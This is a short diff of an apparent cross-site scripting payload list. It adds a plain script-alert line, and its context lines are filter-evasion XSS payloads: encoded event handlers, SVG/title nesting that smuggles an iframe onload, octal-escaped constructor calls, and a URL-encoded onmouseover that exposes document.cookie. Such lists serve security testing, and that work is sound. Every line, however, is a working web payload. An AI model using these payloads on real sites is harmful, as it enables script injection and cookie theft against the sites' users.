@@ -1,5 +1,6 @@
 1'"><A HRef=\" AutoFocus OnFocus=top/**/?.['ale'%2B'rt'](1)>
 <detalhes%0Aopen%0AonToGgle%0A=%0Aabc=(co\u006efirm);abc%28%60xss%60%26%230000000000000000041//
+<script>alert('test');</script>
 <svg><title><title><image href="</title><iframe onload=alert(1)>" /></title></title></svg>
 (()=>{})["\143\157\156\163\164\162\165\143\164\157\162"]("\141\154\145\162\164()")()
 %22onmouseover=window[%27al%27%2B%27er%27%2B([%27t%27,%27b%27,%27c%27][0])](document[%27cooki%27%2B(['e','c','z'][0])]);%22
